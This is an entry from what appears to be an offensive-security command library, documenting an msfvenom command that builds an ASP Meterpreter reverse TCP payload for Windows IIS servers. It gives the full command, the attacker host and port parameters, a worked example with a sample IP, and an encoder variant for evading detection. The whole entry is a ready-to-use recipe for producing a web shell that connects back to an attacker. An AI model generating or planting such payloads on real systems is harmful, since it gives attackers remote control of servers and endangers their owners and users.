---
id: 5b1e757d-98ec-4a99-a5be-efcd1e74fc6a
name: generate-asp-meterpreter-payload
type: command
executor: bash
data: >-
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f
  asp > shell.asp
output: null
created_at: '2023-04-06T03:56:24.923520+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Windows
tags:
  - meterpreter
  - reverse-shell
  - asp
verified: true
validated: true
---

# Generate ASP Meterpreter Payload

## Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f asp > shell.asp
```

## Description

This command generates an ASP-encoded Meterpreter reverse TCP payload for Windows IIS environments, creating a web-scriptable shell that connects back to the attacker's listener.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker's IP address for the reverse connection | Yes |
| $_LPORT | Port on which the attacker is listening | Yes |
| -p windows/meterpreter/reverse_tcp | Specifies the Windows Meterpreter reverse TCP payload type | Built-in |
| -f asp | Output format as ASP script | Built-in |
| > shell.asp | Redirects output to shell.asp file | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f asp > shell.asp
```

### Advanced Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f asp -e x86/shikata_ga_nai > shell.asp
```

## Expected Output

The command runs silently, producing a file shell.asp containing encoded ASP code (e.g., starting with <% ). File size ~2-5 KB. No console output on success; errors if msfvenom not found or invalid params.

## Related

- [[commands/generate-windows-meterpreter-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
